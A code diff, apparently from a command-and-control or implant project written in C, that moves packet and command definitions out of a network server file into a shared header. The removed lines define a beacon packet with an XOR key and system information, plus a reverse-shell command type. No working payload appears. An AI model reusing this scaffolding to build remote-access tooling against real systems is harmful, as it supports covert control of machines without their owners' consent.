@@ -22,40 +22,8 @@
 #include <unistd.h>
 #include <stdbool.h>
 #include <string.h>
+#include "../net.h"
 #include "../defs.h"
-#include "../stub/shell.h"
-#include "../stub/sys.h"
-
-#ifndef NET_BACKLOG_COUNT
-#define NET_BACKLOG_COUNT 4
-#endif
-
-#ifndef NET_PACKET_MAX_SIZE
-#define NET_PACKET_MAX_SIZE 1024
-#endif
-
-#ifndef NET_COMMANDS
-#define NET_COMMAND_HELLO         0
-#define NET_COMMAND_REVERSE_SHELL 1
-#define NET_COMMANDS
-#endif
-
-#ifndef NET_PACKET_BEACON
-typedef struct{
-  int xor_key;
-  int command;
-  sys_info_t sys_info;
-} net_packet_beacon_t;
-#define NET_PACKET_BEACON 0
-#endif
-
-#ifndef NET_PACKET_CMD_REVERSE_TCP
-typedef struct{
-  net_packet_beacon_t header;
-  shell_reverse_tcp_args_t args;
-} net_packet_cmd_reverse_tcp_t;
-#define NET_PACKET_CMD_REVERSE_TCP
-#endif
 
 #ifndef NET_START_SERVER_ARGS
 typedef struct{
@@ -70,14 +38,14 @@ bool net_start_server(int port){
     :port: (int) server listening port
     :returns: (bool)
   */
-  if (port < TCP_PORT_MIN || port > TCP_PORT_MAX){
+  if (port < NET_PORT_MIN || port > NET_PORT_MAX){
     fprintf(stderr, "[-] server port is invalid\n");
     return false;
   }
 
   int server_fd, client_fd, err;
   struct sockaddr_in server, client;
-  char data[NET_PACKET_MAX_SIZE];
+  char data[NET_MAX_RESPONSE_SIZE];
   pid_t child_pid;
 
   // setup socket
@@ -119,7 +87,7 @@ bool net_start_server(int port){
     if ((child_pid = fork()) == 0){
       while (true){
         close(server_fd);
-        int read = recv(client_fd, data, NET_PACKET_MAX_SIZE, 0);
+        int read = recv(client_fd, data, NET_MAX_RESPONSE_SIZE, 0);
         if (!read){
           break;
         }
